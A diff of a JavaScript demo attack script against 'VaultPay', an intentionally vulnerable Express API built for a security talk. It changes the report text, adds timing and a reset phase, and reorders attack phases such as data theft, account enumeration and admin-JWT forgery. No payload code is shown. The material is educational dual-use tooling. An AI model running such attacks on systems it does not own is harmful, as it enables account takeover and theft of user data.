@@ -1134,24 +1334,25 @@ ${c.bold}${c.red}╔════════════════════
 
   console.log(`\n  ${c.bold}App findings:${c.reset}`);
   for (const f of stolen.findings) {
-    finding(f.severity, f.title);
+    finding(f.severity, f.title, f);
     if (f.detail) info(f.detail);
   }
 
   console.log(`
-  ${c.bold}DaloyJS defaults that would have blocked most of this:${c.reset}
-    · bodyLimitBytes (1 MiB) + requestTimeoutMs (30s)
-    · rateLimit / loginThrottle → 429 under flood
-    · secureHeaders auto-install
-    · safeRedirect + fetchGuard (SSRF)
-    · routing path hardening / contained static files
-    · JWT algorithm allowlists + weak-secret boot guards
-    · schema .strict() / response validation
-    · prod problem+json redaction (no stack leaks)
-    · auth hooks that fail closed — authn AND authz
+  ${c.bold}What Express actually fails to give you by default:${c.reset}
+    · No secure browser headers (and x-powered-by stays ON)
+    · No rate limiting / login throttle
+    · No request timeout budget
+    · No authz primitive (requireAuth ≠ requireRole)
+    · No response schema / field allowlist
+    · No SSRF / open-redirect helpers
+    (Where Express *does* have a default — e.g. express.json 100kb, finalhandler
+     stack redaction in production — this demo sometimes replaces them on purpose.
+     Those findings are labelled misconfig, not framework-gap.)
 
-  ${c.dim}See CLOUDFLARE-VS-APP-SECURITY.md for the edge-vs-app slide.
-  Only attack systems you own. Educational VaultPay demo only.${c.reset}
+  ${c.dim}See CLOUDFLARE-VS-APP-SECURITY.md for the edge-vs-app framing.
+  Only attack systems you own. Educational VaultPay demo only.
+  Tear down or gate public deploys after the talk (TEARDOWN.md).${c.reset}
 `);
 
   if (asJson) {
@@ -1160,6 +1361,7 @@ ${c.bold}${c.red}╔════════════════════
         {
           target: BASE,
           requests: reqSeq,
+          elapsedSeconds: Number(elapsedSec),
           findings: stolen.findings,
           platformNotes: stolen.platformNotes,
           usersStolen: stolen.users.length,
@@ -1176,17 +1378,18 @@ ${c.bold}${c.red}╔════════════════════
 
   if (criticals > 0) {
     console.log(
-      `${c.bgRed}${c.white}${c.bold}  DEMO RESULT: API PWNED — ${criticals} critical findings · ${reqSeq} requests  ${c.reset}\n`
+      `${c.bgRed}${c.white}${c.bold}  DEMO RESULT: API PWNED — ${criticals} critical findings · ${reqSeq} requests · ${elapsedSec}s  ${c.reset}\n`
     );
   } else {
     console.log(
-      `${c.bgGreen}${c.white}${c.bold}  DEMO RESULT: no criticals (unexpected for VaultPay)  ${c.reset}\n`
+      `${c.bgGreen}${c.white}${c.bold}  DEMO RESULT: 0 critical · ${reqSeq} requests · ${elapsedSec}s — green run (or unexpected)  ${c.reset}\n`
     );
   }
 }
 
 async function main() {
   banner();
+  await phaseReset();
   await phaseRecon();
   await phaseMissingSecurityHeaders();
   await phaseBodyLimit();
@@ -1198,9 +1401,10 @@ async function main() {
   await phaseSlowTimeout();
   await phaseUnauthDataTheft();
   await phaseAccountEnumeration();
-  await phaseAuthzAndForgery();
+  // Settings + raw TCP before the climax so the forged admin JWT is the last LOOT.
   await phaseSettingsMerge();
   await phaseRawHeaderAbuse();
+  await phaseAuthzAndForgery();
   printReport();
 }
 
